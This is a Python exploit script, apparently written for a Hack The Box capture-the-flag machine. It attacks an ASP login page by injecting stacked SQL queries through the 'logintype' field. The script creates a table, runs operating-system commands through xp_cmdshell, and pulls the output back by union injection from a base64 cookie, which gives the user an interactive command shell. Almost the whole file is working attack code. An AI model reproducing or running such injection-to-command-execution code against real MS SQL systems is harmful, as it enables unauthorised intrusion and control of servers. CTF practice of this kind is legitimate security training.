#!/usr/bin/python3

from pwn import *
from base64 import b64decode
import requests, signal, pdb

def def_handler(sig, frame):
    print("\n\n[!] Leaving\n")
    dropTable()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global Variable
main_url = "http://members.streetfighterclub.htb/old/verify.asp"

def createTable():
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;create table rce(id int identity(1,1) primary key, output varchar(1024));-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # creating rce table
    r = requests.post(main_url, data=post_data)

def truncateTable():
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;truncate table rce;-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # truncate table
    r = requests.post(main_url, data=post_data)

def executeCommand(command):
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;insert into rce(output) exec Xp_cMdShEll "%s";-- -' % command,
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # Execute command
    r = requests.post(main_url, data=post_data)
    
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2 union select 1,2,3,4,(select top 1 id from rce order by id desc),6-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # Get ID top counter
    r = requests.post(main_url, data=post_data, allow_redirects=False)
    topIdCounter = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "=")).decode()
    print(topIdCounter)

    for i in range(1, int(topIdCounter)):
        post_data = {
            'username': 'admin',
            'password': 'admin',
            'logintype': '2 union select 1,2,3,4,(select output from rce where id=%d),6-- -' % i,
            'rememberme': 'ON',
            'B1': 'LogIn'
        }
        r = requests.post(main_url, data=post_data, allow_redirects=False)
        output = b64decode(r.headers['Set-Cookie'].split(";")[0].replace("Email=", "").replace("%3D", "="))

        if b"\xeb\xde\x94\xd8" not in output:
            print(output.decode())
    truncateTable()

def dropTable():
    post_data = {
        'username': 'admin',
        'password': 'admin',
        'logintype': '2;drop table rce;-- -',
        'rememberme': 'ON',
        'B1': 'LogIn'
    }
    # Dropping table
    r = requests.post(main_url, data=post_data)

if __name__ == "__main__":
    createTable()

    while True:
        command = input("> ")
        command = command.strip('\n')

        executeCommand(command)

